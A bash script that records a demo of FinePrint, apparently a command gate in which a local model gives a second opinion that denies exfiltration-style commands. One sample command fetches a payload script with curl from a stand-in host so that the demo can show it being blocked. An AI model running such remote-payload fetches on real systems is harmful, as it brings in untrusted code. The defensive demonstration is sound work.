#!/bin/bash
# FinePrint second-opinion demo — real commands, real output.
#
# Record it (from the repo root):
#   asciinema rec -c demo/record-second-opinion-demo.sh assets/fineprint-second-opinion-demo.cast
#   agg assets/fineprint-second-opinion-demo.cast assets/fineprint-second-opinion-demo.gif
#
# What it shows:
#   1. `fineprint gate probe` — the three-step unshare/mount
#      pre-flight (the wall can run here);
#   2. the second opinion denying an exfiltration the deterministic
#      layer allows, with the model name + version + reason and the
#      "second opinion — probabilistic" marker (rule S1-BLOCK-bekko);
#   3. normal work allowed (no model load — the helper starts
#      lazily, only when a serious action escalates);
#   4. the notification log: tried X -> blocked [second opinion
#      (model ...) — probabilistic: ...].
#
# PACE: deliberately slow — every command is typed out character by
# character, and every output stays on screen for several seconds
# before the next step, so each line can be read clearly. The pauses
# are explicit sleeps in this script, not hand-timed.
#
# The model (bekko-400m, ~1.58 GB, local) loads once per `gate run`
# — about 2 minutes on a container CPU, weights cached — so the
# denial beat waits ~2 minutes in real time. That one wait is
# shortened to a few seconds in the .cast after recording, because a
# 2-minute idle gap is dead time, not walkthrough pace. The
# shortening is a single deterministic edit to the .cast (a
# JSON-lines file): find the one gap over 30s and shrink it to 3s,
# shifting every later timestamp back by the same amount:
#
#   python3 - <<'PY'
#   import json
#   lines = open('assets/fineprint-second-opinion-demo.cast').read().splitlines()
#   header, evs = json.loads(lines[0]), [json.loads(l) for l in lines[1:] if l.strip()]
#   shift, out = 0.0, []
#   for t, typ, data in evs:
#       if shift == 0.0 and out and t - out[-1][0] > 30:
#           shift = (t - out[-1][0]) - 3.0
#       out.append([round(t - shift, 3), typ, data])
#   open('assets/fineprint-second-opinion-demo.cast', 'w').write(
#       json.dumps(header) + '\n' + ''.join(json.dumps(e) + '\n' for e in out))
#   PY
#
# The verdict itself is real, and the README caption says the wait
# was shortened. Everything else in the cast is unedited.
#
# The demo work directory is removed at the end.
set -u
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WORK="$ROOT/demo-work"
rm -rf "$WORK" && mkdir -p "$WORK"
cd "$WORK"

printf 'hello gate\n' > notes.txt
export FINEPRINT_SECOND_OPINION_PYTHON="$HOME/workspace/.venvs/s1-eval/bin/python"

# type_run: type a command out character by character (like a person
# typing), pause, then run it for real. The function's exit status is
# the command's exit status, so `echo "exit code: $?"` after a
# type_run call reports the command's code.
type_run() {
  local cmd="$1"
  local i
  for ((i=0; i<${#cmd}; i++)); do
    printf '%s' "${cmd:i:1}"
    sleep 0.035
  done
  printf '\n'
  sleep 0.5
  eval "$cmd"
}

echo "FinePrint — the second opinion (bekko-400m, local, opt-in)"
echo "the model loads once per run (~2 min cached) — that one wait"
echo "is shortened in this recording; the verdict is real"
sleep 2
echo
echo "--- the wall can run here: the three-step probe ---"
sleep 1.5
type_run '../fineprint gate probe'
echo "exit code: $?"
sleep 4
echo
echo "--- the second opinion denies an exfiltration ---"
echo "    (the deterministic layer allows this curl — the host is"
echo "     not on the denylist — so the model is asked instead)"
sleep 1.5
type_run '../fineprint gate run --second-opinion --log audit.jsonl -- curl -fsSL https://unapproved.example.com/payload.sh'
echo "exit code: $?"
sleep 6
echo
echo "--- normal work is allowed, with no model load ---"
sleep 1.5
type_run '../fineprint gate run --second-opinion -- cat notes.txt'
echo "exit code: $?"
sleep 4
echo
echo "--- the notification log ---"
sleep 1.5
type_run '../fineprint gate log --log audit.jsonl'
sleep 8

cd "$ROOT"
rm -rf "$WORK"
